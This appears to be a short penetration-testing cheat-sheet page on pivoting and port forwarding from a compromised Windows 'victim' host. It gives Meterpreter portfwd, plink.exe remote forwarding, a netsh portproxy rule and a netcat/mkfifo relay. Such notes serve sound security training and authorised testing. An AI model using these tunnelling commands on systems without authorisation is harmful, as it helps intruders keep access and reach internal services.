# 🪟 Windows

### Metasploit

```
meterpreter> portfwd add -l 8080 -p 80 -r 172.16.185.132
```

### Plink.exe

It is a **Microsoft** tool that performs the functions that **SSH** would perform on a **UNIX** system.\
It is an old tool but since it is a static binary we can pass it from our team to execute it on the victim.

We must raise the ssh server on our computer, I in this case create a user to not reveal the credentials.

Now on the victim machine we will use plink in remote port forwarding mode, the syntax is similar to that of the ssh.

```
plink.exe -ssh test@172.16.75.1 -R 8080:localhost:80
```



### NETSH

In this case we will use a microsoft tool that is found by default so if you can not upload files it will be a good option. In despite of this we must be administrator.

In the victim’s machine we will have to execute this command that will have a proxy port that will forward the port traffic of the address that we indicate in the connect address and connect port.

```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.0.0.1
```

In our machine we will have to connect in the same way as in some previous ones.

```
rm -f fifo;mkfifo fifo;nc -v -lk -p 8080 <fifo | nc 192.168.1.38 8080 >fifo
```
